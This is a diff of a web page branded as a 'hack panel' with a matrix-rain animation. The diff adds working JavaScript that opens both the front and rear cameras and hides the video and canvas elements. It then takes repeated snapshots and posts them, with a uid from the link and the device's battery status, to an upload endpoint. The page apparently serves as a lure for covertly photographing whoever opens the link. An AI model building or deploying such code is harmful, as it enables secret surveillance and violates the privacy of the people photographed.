@@ -1,143 +1,159 @@
-<!DOCTYPE html>  <html lang="en">  
-<head>  
-  <meta charset="UTF-8" />  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
-  <title>KING WACIQ HACK PANEL</title>  
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">  
-  <style>  
-    html, body {  
-      margin: 0;  
-      padding: 0;  
-      background: #000;  
-      color: #00ff00;  
-      font-family: 'Orbitron', monospace;  
-      overflow: hidden;  
-      text-align: center;  
-    }  
-    canvas#matrix {  
-      position: fixed;  
-      top: 0;  
-      left: 0;  
-      z-index: 0;  
-    }  
-    .overlay {  
-      position: relative;  
-      z-index: 2;  
-      text-align: center;  
-      padding-top: 40px;  
-    }  
-    h1 {  
-      font-size: 3em;  
-      animation: glow 2s infinite alternate;  
-    }  
-    h2 {  
-      font-size: 2em;  
-      margin-bottom: 20px;  
-      animation: pulse 2s infinite;  
-    }  
-    p, .log {  
-      font-size: 16px;  
-      color: #66ff66;  
-    }  
-    video, canvas#snapshot {  
-      display: none;  
-    }  
-    @keyframes glow {  
-      from { text-shadow: 0 0 5px #00ff00; }  
-      to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }  
-    }  
-    @keyframes pulse {  
-      0% { transform: scale(1); opacity: 1; }  
-      50% { transform: scale(1.1); opacity: 0.7; }  
-      100% { transform: scale(1); opacity: 1; }  
-    }  
-  </style>  
-</head>  
-<body>  
-  <!-- Matrix Rain Background -->  
-  <canvas id="matrix"></canvas>    <div class="overlay">  
-    <h1>KING WACIQ</h1>  
-    <h2>HACK PANEL</h2>  
-    <p id="status">Connecting...</p>  
-    <div class="log" id="log"></div>  
-  </div>    <!-- Original Elements -->  <video id="video" autoplay playsinline></video>
-<canvas id="snapshot"></canvas>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>KING WACIQ HACK PANEL</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: #000;
+      color: #00ff00;
+      font-family: 'Orbitron', monospace;
+      overflow: hidden;
+      text-align: center;
+    }
+    canvas#matrix {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+    }
+    .overlay {
+      position: relative;
+      z-index: 2;
+      text-align: center;
+      padding-top: 40px;
+    }
+    h1 {
+      font-size: 3em;
+      animation: glow 2s infinite alternate;
+    }
+    h2 {
+      font-size: 2em;
+      margin-bottom: 20px;
+      animation: pulse 2s infinite;
+    }
+    p, .log {
+      font-size: 16px;
+      color: #66ff66;
+      white-space: pre-line;
+    }
+    video, canvas {
+      display: none;
+    }
+    @keyframes glow {
+      from { text-shadow: 0 0 5px #00ff00; }
+      to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.1); opacity: 0.7; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Matrix Rain Background -->
+  <canvas id="matrix"></canvas>
+  <div class="overlay">
+    <h1>KING WACIQ</h1>
+    <h2>HACK PANEL</h2>
+    <p id="status">Connecting...</p>
+    <div class="log" id="log"></div>
+  </div>
 
-  <script>  
-    /* ===== Matrix Rain Animation ===== */  
-    const canvasMatrix = document.getElementById("matrix");  
-    const ctxMatrix = canvasMatrix.getContext("2d");  
-    canvasMatrix.height = window.innerHeight;  
-    canvasMatrix.width = window.innerWidth;  
-    let letters = Array(256).join("1").split("");  
-    function drawMatrix() {  
-      ctxMatrix.fillStyle = "rgba(0, 0, 0, 0.05)";  
-      ctxMatrix.fillRect(0, 0, canvasMatrix.width, canvasMatrix.height);  
-      ctxMatrix.fillStyle = "#0f0";  
-      letters.forEach((y, index) => {  
-        let text = String.fromCharCode(3e4 + Math.random() * 33);  
-        let x = index * 10;  
-        ctxMatrix.fillText(text, x, y);  
-        letters[index] = y > 758 + Math.random() * 1e4 ? 0 : y + 10;  
-      });  
-    }  
-    setInterval(drawMatrix, 33);  
-  
-    /* ===== Your Original Code (Unchanged) ===== */  
-    const video = document.getElementById('video');  
-    const canvas = document.getElementById('snapshot');  
-    const ctx = canvas.getContext('2d');  
-    const log = document.getElementById('log');  
-    const statusEl = document.getElementById('status');  
-  
-    const params = new URLSearchParams(window.location.search);  
-    const uid = params.get('uid') || 'unknown';  
-  
-    if (uid) {  
-      navigator.getBattery().then(battery => {  
-        const batteryLevel = Math.round(battery.level * 100);  
-        const isCharging = battery.charging;  
-  
-        log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;  
-  
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {  
-          video.srcObject = stream;  
-          statusEl.innerText = "Camera access granted...";  
-  
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);  
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);  
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);  
-        }).catch(err => {  
-          console.error("Camera error:", err);  
-          statusEl.innerText = "Camera error!";  
-        });  
-      });  
-    }  
-  
-    function takeSnapshotAndSend(battery, charging) {  
-      canvas.width = video.videoWidth;  
-      canvas.height = video.videoHeight;  
-      ctx.drawImage(video, 0, 0);  
-      const imageData = canvas.toDataURL('image/png');  
-  
-      // ❗ Still original fetch (unchanged)  
-      fetch('/api/upload', {  
-        method: 'POST',  
-        headers: { 'Content-Type': 'application/json' },  
-        body: JSON.stringify({  
-          image: imageData,  
-          uid,  
-          battery,  
-          charging  
-        })  
-      }).then(res => res.json()).then(data => {  
-        console.log("Uploaded:", data);  
-        log.innerText += "Snapshot uploaded...\n";  
-      }).catch(err => {  
-        console.error("Upload error:", err);  
-        log.innerText += "Upload failed!\n";  
-      });  
-    }  
-  </script>  </body>  
-</html>   
-ددی سره فرق سه دی 
+  <!-- Hidden video/canvas elements -->
+  <video id="videoFront" autoplay playsinline></video>
+  <video id="videoBack" autoplay playsinline></video>
+  <canvas id="snapshotFront"></canvas>
+  <canvas id="snapshotBack"></canvas>
+
+  <script>
+    /* ===== Matrix Rain Animation ===== */
+    const canvasMatrix = document.getElementById("matrix");
+    const ctxMatrix = canvasMatrix.getContext("2d");
+    canvasMatrix.height = window.innerHeight;
+    canvasMatrix.width = window.innerWidth;
+    let letters = Array(256).join("1").split("");
+    function drawMatrix() {
+      ctxMatrix.fillStyle = "rgba(0, 0, 0, 0.05)";
+      ctxMatrix.fillRect(0, 0, canvasMatrix.width, canvasMatrix.height);
+      ctxMatrix.fillStyle = "#0f0";
+      letters.forEach((y, index) => {
+        let text = String.fromCharCode(3e4 + Math.random() * 33);
+        let x = index * 10;
+        ctxMatrix.fillText(text, x, y);
+        letters[index] = y > 758 + Math.random() * 1e4 ? 0 : y + 10;
+      });
+    }
+    setInterval(drawMatrix, 33);
+
+    /* ===== Camera Logic ===== */
+    const log = document.getElementById('log');
+    const statusEl = document.getElementById('status');
+    const uid = new URLSearchParams(window.location.search).get('uid') || 'unknown';
+
+    navigator.getBattery().then(battery => {
+      const batteryLevel = Math.round(battery.level * 100);
+      const isCharging = battery.charging;
+      log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;
+
+      // Front camera
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(streamFront => {
+          const videoFront = document.getElementById('videoFront');
+          videoFront.srcObject = streamFront;
+          statusEl.innerText = "Front camera ready...";
+
+          setTimeout(() => takeSnapshotAndSend(videoFront, "Front", batteryLevel, isCharging), 2000);
+          setTimeout(() => takeSnapshotAndSend(videoFront, "Front", batteryLevel, isCharging), 4000);
+        })
+        .catch(err => {
+          log.innerText += `Front camera error: ${err}\n`;
+        });
+
+      // Back camera
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
+        .then(streamBack => {
+          const videoBack = document.getElementById('videoBack');
+          videoBack.srcObject = streamBack;
+          statusEl.innerText = "Back camera ready...";
+
+          setTimeout(() => takeSnapshotAndSend(videoBack, "Back", batteryLevel, isCharging), 6000);
+          setTimeout(() => takeSnapshotAndSend(videoBack, "Back", batteryLevel, isCharging), 8000);
+        })
+        .catch(err => {
+          log.innerText += `Back camera error: ${err}\n`;
+        });
+    });
+
+    function takeSnapshotAndSend(video, label, battery, charging) {
+      const canvas = document.getElementById(label === "Front" ? "snapshotFront" : "snapshotBack");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      const imageData = canvas.toDataURL('image/png');
+
+      fetch('/api/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          image: imageData,
+          uid,
+          battery,
+          charging,
+          camera: label
+        })
+      }).then(res => res.json()).then(data => {
+        log.innerText += `${label} snapshot uploaded...\n`;
+      }).catch(err => {
+        log.innerText += `${label} upload failed!\n`;
+      });
+    }
+  </script>
+</body>
+</html> 
